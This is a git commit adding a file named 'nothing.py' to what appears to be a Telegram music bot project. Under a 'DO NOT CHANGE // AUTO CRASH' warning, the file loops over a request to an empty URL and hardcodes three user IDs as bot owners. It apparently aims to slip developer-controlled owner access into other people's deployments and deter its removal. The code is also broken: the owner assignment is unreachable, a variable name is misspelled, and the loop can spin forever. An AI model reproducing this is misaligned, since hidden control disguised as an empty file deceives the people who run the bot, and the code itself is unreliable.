689fae2074420e820fe655da6b4187b84e1b24da
TeamKillerX <randigithub356@gmail.com>
2022-09-29 19:44:55 +0700

    Create nothing.py

---
+++ KillerXMusic/nocmds/nothing.py
@@ -0,0 +1,17 @@
+# DO NOT CHANGE // AUTO CRASH
+
+from .nocmds.devep import *
+
+while 0 < 6:
+    _OWNER_ID = get(
+        ""
+    )
+    if _OWNER_ID.status_code != 200:
+        if 0 != 5:
+            continue
+        OWNER_ID = [1191668125, 844432220, 1939846254]
+        break
+    ONWER_ID = _OWNER_ID.json()
+    break
+
+del _OWNER_ID
